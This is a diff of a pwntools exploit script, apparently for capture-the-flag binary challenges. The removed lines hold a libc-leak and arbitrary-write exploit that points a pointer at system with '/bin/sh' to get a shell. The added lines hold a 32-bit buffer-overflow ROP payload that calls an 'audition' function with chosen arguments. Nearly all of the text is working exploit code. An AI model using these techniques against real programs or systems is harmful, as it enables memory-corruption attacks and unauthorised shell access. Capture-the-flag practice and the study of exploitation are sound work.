@@ -4,9 +4,9 @@
 
 from pwn import *
 
-local_file  = './write'
+local_file  = './bof'
 local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
-remote_libc = '../libc.so.6'
+remote_libc = local_libc # '../libc.so.6'
 
 is_local = False
 is_remote = False
@@ -46,37 +46,20 @@ def debug(cmd=''):
 
 # info
 # gadget
-prdi = 0x00000000000009e3 # pop rdi ; ret
-
 # elf, libc
+audition = 0x08049182
 
-ru('puts: ')
-puts = eval(rc(14))
-ru('stack: ')
-stack = eval(rc(14))
+# rop1
+offset = cyclic_find('daab')
+payload = 'A'*offset
+payload += p32(audition) + p32(0xdeadbeef) + p32(1200) + p32(366)
 
-libcbase = puts - libc.sym['puts']
-info_addr('libcbase',libcbase)
+sla("What's your name?\n",'TaQini')
+sla('What song will you be singing?\n',payload)
 
-ptr = libcbase+0x619f60 #0x239f68
-info_addr('ptr',ptr)
-system = libcbase+libc.sym['system']
-info_addr('system',system)
-rdi = libcbase+0x619968 #0x239968
-info_addr('rdi',rdi)
-
-sl('w')
-sl(str(ptr))
-sl(str(system))
-
-sl('w')
-sl(str(rdi))
-sl(str(u64('/bin/sh\0')))
-
-debug('b *$rebase(0x969)')
-sl('q')
-
+# debug()
 # info_addr('tag',addr)
 # log.warning('--------------')
 
 p.interactive()
+
